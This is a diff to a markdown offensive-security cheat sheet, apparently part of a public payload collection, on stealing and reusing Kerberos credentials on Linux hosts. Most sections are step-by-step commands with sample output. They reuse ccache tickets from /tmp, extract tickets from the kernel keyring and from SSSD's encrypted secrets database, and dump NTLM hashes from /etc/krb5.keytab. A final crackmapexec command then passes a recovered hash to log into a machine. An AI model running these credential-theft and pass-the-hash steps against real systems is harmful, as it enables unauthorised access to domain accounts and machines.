@@ -4,8 +4,18 @@
 ### CCACHE ticket reuse from /tmp
 - When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions
 
-#### List the current ticket used for authentication with `env | grep KRB5CCNAME`. The format is portable and the ticket can be reused by setting the environment variable with `export KRB5CCNAME=/tmp/ticket.ccache`. Kerberos ticket name format is `krb5cc_%{uid}` where uid is the user UID. 
+#### List the current ticket used for authentication 
+```
+env | grep KRB5CCNAME
+````
 
+#### Reuuse ticket
+```
+export KRB5CCNAME=/tmp/ticket.ccache
+```
+
+#### List kerberos tickets and reuse ticket
+- Kerberos ticket name format is `krb5cc_%{uid}` where uid is the user UID. 
 ```
 $ ls /tmp/ | grep krb5cc
 krb5cc_1000
@@ -15,11 +25,8 @@ krb5cc_1569901115
 $ export KRB5CCNAME=/tmp/krb5cc_1569901115
 ```
 
-
 ### CCACHE ticket reuse from keyring
-
-Tool to extract Kerberos tickets from Linux kernel keys : https://github.com/TarlogicSecurity/tickey
-
+- Tool to extract Kerberos tickets from Linux kernel keys : https://github.com/TarlogicSecurity/tickey
 ```
 # Configuration and build
 git clone https://github.com/TarlogicSecurity/tickey
@@ -39,36 +46,31 @@ make CONF=Release
 ```
 
 ### CCACHE ticket reuse from SSSD KCM
-
-SSSD maintains a copy of the database at the path `/var/lib/sss/secrets/secrets.ldb`. 
-The corresponding key is stored as a hidden file at the path `/var/lib/sss/secrets/.secrets.mkey`. 
-By default, the key is only readable if you have **root** permissions.
-
-Invoking `SSSDKCMExtractor` with the --database and --key parameters will parse the database and decrypt the secrets.
-
-```powershell
-git clone https://github.com/fireeye/SSSDKCMExtractor
+- https://github.com/fireeye/SSSDKCMExtractor
+- SSSD maintains a copy of the database at the path `/var/lib/sss/secrets/secrets.ldb`. 
+- The corresponding key is stored as a hidden file at the path `/var/lib/sss/secrets/.secrets.mkey`. 
+- By default, the key is only readable if you have **root** permissions.
+- Invoking `SSSDKCMExtractor` with the --database and --key parameters will parse the database and decrypt the secrets.
+```
 python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
 ```
 
-The credential cache Kerberos blob can be converted into a usable Kerberos CCache file that can be passed to Mimikatz/Rubeus.
+- The credential cache Kerberos blob can be converted into a usable Kerberos CCache file that can be passed to Mimikatz/Rubeus.
 
 
 ### CCACHE ticket reuse from keytab
-
-```powershell
-git clone https://github.com/its-a-feature/KeytabParser
+- https://github.com/its-a-feature/KeytabParser
+```
 python KeytabParser.py /etc/krb5.keytab
 klist -k /etc/krb5.keytab
 ```
 
 ### Extract accounts from /etc/krb5.keytab
-
-The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service's password, and must be kept secure. 
+- The service keys used by services that run as root are usually stored in the keytab file ```/etc/krb5.keytab```. This service key is the equivalent of the service's password, and must be kept secure. 
 
 Use [`klist`](https://adoptopenjdk.net/?variant=openjdk13&jvmVariant=hotspot) to read the keytab file and parse its content. The key that you see when the [key type](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey) is 23  is the actual NT Hash of the user.
 
-```powershell
+```
 $ klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
 [...]
 [26] Service principal: host/COMPUTER@DOMAIN
@@ -79,10 +81,11 @@ $ klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
 [...]
 ```
 
-On Linux you can use [`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract): we want RC4 HMAC hash to reuse the NLTM hash.
+#### KeytabExtract
+- On Linux you can use [`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract): we want RC4 HMAC hash to reuse the NLTM hash.
 
-```powershell
-$ python3 keytabextract.py krb5.keytab 
+```
+python3 keytabextract.py krb5.keytab 
 [!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck
 [+] Keytab File successfully imported.
         REALM : DOMAIN
@@ -90,15 +93,7 @@ $ python3 keytabextract.py krb5.keytab
         NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky
 ```
 
-On macOS you can use `bifrost`.
-
-```powershell
-./bifrost -action dump -source keytab -path test
+#### Connect to the machine with CME.
 ```
-
-Connect to the machine using the account and the hash with CME.
-
-```powershell
-$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
-CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  
+crackmapexec <IP> -u '<COMPUTER ACCOUNT $>' -H "<HASH>" -d <DOMAIN> 
 ```
